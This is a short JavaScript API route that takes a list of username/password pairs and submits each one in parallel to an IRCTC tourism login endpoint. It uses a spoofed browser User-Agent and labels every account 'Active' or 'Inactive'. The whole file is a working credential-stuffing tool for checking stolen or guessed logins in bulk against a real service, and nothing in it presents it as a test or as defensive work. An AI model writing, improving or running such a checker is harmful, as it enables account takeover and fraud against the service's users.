const IRCTC_LOGIN_URL = "https://www.irctctourism.com/NewUserlogin/user/loginForIv4";

async function checkCredential({ username, password }) {
  if (!username || !password) {
    return { username: username || 'N/A', status: '❌ Invalid credentials' };
  }

  try {
    const data = Buffer.from(`${username}:${password}`).toString("base64");
    const payload = { data };
    const headers = {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "User-Agent": "Mozilla/5.0"
    };

    const response = await fetch(IRCTC_LOGIN_URL, {
      method: "POST",
      headers,
      body: JSON.stringify(payload),
    });

    if (!response.ok) {
      return { username, status: `❌ Error (HTTP ${response.status} ${response.statusText})` };
    }

    const result = await response.json();

    if (result.status === "SUCCESS") {
      return { username, status: "✅ Active" };
    }
    return { username, status: "❌ Inactive" };
  } catch (error) {
    console.error(`Error checking ${username}:`, error);
    return { username, status: "❌ Error" };
  }
}

export default async function handler(req, res) {
  if (req.method !== "POST") {
    res.setHeader('Allow', ['POST']);
    return res.status(405).end("Method Not Allowed");
  }

  const { credentials } = req.body;
  if (!Array.isArray(credentials)) {
    return res.status(400).json({ error: "Invalid 'credentials' format. Expected an array." });
  }

  const promises = credentials.map(checkCredential);
  const results = await Promise.all(promises);

  return res.status(200).json(results);
}
